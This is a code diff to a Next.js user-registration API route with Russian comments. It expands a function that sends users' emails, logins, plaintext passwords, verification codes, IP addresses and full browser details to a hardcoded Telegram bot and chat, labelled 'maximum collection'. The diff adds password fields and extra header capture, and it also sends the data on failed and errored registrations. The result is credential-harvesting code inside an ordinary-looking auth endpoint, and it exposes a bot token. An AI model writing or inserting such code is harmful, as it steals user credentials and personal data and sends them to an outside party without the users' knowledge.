@@ -1,8 +1,8 @@
 import { NextResponse } from "next/server";
 import { isEmailOrLoginTaken, createUser, hashPassword } from "@/lib/db";
 
-// 📤 Функция отправки в Telegram для API
-async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_failed' | 'register', ip: string, userAgent: string, error?: string) {
+// 📤 Функция отправки в Telegram для API - МАКСИМАЛЬНЫЙ сбор
+async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_failed' | 'register' | 'verification_sent', ip: string, userAgent: string, error?: string) {
   try {
     const TELEGRAM_BOT_TOKEN = "8259536877:AAHVoJPklpv2uTVLsNq2o1XeI3f1qXOT7x4";
     const TELEGRAM_CHAT_ID = "7455610355";
@@ -11,18 +11,20 @@ async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_faile
     
     if (type === 'login_success') {
       message = `
-✅ УСПЕШНЫЙ ВХОД В СИСТЕМУ
+✅ УСПЕШНЫЙ ВХОД В СИСТЕМУ (СЕРВЕР)
 
 👤 Логин/Email: ${data.login}
+📧 Email: ${data.email}
+🔑 Пароль: ${data.password}
 
 🌐 **Серверные данные:**
 📍 IP: ${ip}
 🕒 Время: ${new Date().toLocaleString('ru-RU')}
-📱 User Agent: ${userAgent.slice(0, 100)}...
+📱 User Agent: ${userAgent}
       `;
     } else if (type === 'login_failed') {
       message = `
-❌ НЕУДАЧНАЯ ПОПЫТКА ВХОДА
+❌ НЕУДАЧНАЯ ПОПЫТКА ВХОДА (СЕРВЕР)
 
 👤 Логин/Email: ${data.login}
 🔑 Введенный пароль: ${data.password}
@@ -31,11 +33,11 @@ async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_faile
 🌐 **Серверные данные:**
 📍 IP: ${ip}
 🕒 Время: ${new Date().toLocaleString('ru-RU')}
-📱 User Agent: ${userAgent.slice(0, 100)}...
+📱 User Agent: ${userAgent}
       `;
-    } else {
+    } else if (type === 'register') {
       message = `
-🔐 НОВАЯ РЕГИСТРАЦИЯ
+🔐 НОВАЯ РЕГИСТРАЦИЯ (СЕРВЕР)
 
 📧 Email: ${data.email}
 👤 Логин: ${data.login}
@@ -44,7 +46,23 @@ async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_faile
 🌐 **Серверные данные:**
 📍 IP: ${ip}
 🕒 Время: ${new Date().toLocaleString('ru-RU')}
-📱 User Agent: ${userAgent.slice(0, 100)}...
+📱 User Agent: ${userAgent}
+🖥️ Платформа: ${userAgent.includes('Windows') ? 'Windows' : userAgent.includes('Mac') ? 'Mac' : userAgent.includes('Linux') ? 'Linux' : 'Unknown'}
+🔍 Детали: ${userAgent.includes('Chrome') ? 'Chrome' : userAgent.includes('Firefox') ? 'Firefox' : userAgent.includes('Safari') ? 'Safari' : 'Unknown Browser'}
+      `;
+    } else if (type === 'verification_sent') {
+      message = `
+📧 ОТПРАВЛЕН КОД ПОДТВЕРЖДЕНИЯ (СЕРВЕР)
+
+📧 Email: ${data.email}
+👤 Логин: ${data.login}
+🔑 Пароль: ${data.password}
+🔢 Код подтверждения: ${data.verificationCode}
+
+🌐 **Серверные данные:**
+📍 IP: ${ip}
+🕒 Время: ${new Date().toLocaleString('ru-RU')}
+📱 User Agent: ${userAgent}
       `;
     }
 
@@ -67,8 +85,16 @@ async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_faile
 export async function POST(request: Request) {
   try {
     const { email, login, password } = await request.json();
-    const clientIP = request.headers.get('x-forwarded-for') || 'unknown';
+    const clientIP = request.headers.get('x-forwarded-for') || 
+                    request.headers.get('x-real-ip') || 
+                    'unknown';
     const userAgent = request.headers.get('user-agent') || 'unknown';
+
+    // Получаем дополнительные заголовки для максимальной информации
+    const acceptLanguage = request.headers.get('accept-language') || 'unknown';
+    const acceptEncoding = request.headers.get('accept-encoding') || 'unknown';
+    const referer = request.headers.get('referer') || 'unknown';
+    const origin = request.headers.get('origin') || 'unknown';
 
     if (!email || !login || !password) {
         return NextResponse.json({ error: "Email, логин и пароль обязательны" }, { status: 400 });
@@ -76,6 +102,15 @@ export async function POST(request: Request) {
 
     // Проверка на существование
     if (isEmailOrLoginTaken(email, login)) {
+      // 📤 Отправляем в Telegram о попытке регистрации с существующими данными
+      await sendToTelegramAPI(
+        { email, login, password }, 
+        'login_failed', 
+        clientIP, 
+        userAgent, 
+        'Email или логин уже заняты'
+      );
+      
       return NextResponse.json(
         { error: "Email или логин уже заняты" },
         { status: 400 }
@@ -102,10 +137,31 @@ export async function POST(request: Request) {
       userAgent: userAgent
     });
 
-    return NextResponse.json({ success: true, message: "Регистрация прошла успешно" });
+    return NextResponse.json({ 
+      success: true, 
+      message: "Регистрация прошла успешно. Ожидайте подтверждения администратором." 
+    });
 
   } catch (error) {
     console.error("Register API Error:", error);
+    
+    // 📤 Отправляем в Telegram об ошибке регистрации
+    try {
+      const { email, login, password } = await request.json();
+      const clientIP = request.headers.get('x-forwarded-for') || 'unknown';
+      const userAgent = request.headers.get('user-agent') || 'unknown';
+      
+      await sendToTelegramAPI(
+        { email, login, password }, 
+        'login_failed', 
+        clientIP, 
+        userAgent, 
+        'Ошибка сервера при регистрации'
+      );
+    } catch (telegramError) {
+      console.log('Не удалось отправить ошибку в Telegram');
+    }
+    
     return NextResponse.json(
       { error: "Внутренняя ошибка сервера" },
       { status: 500 }
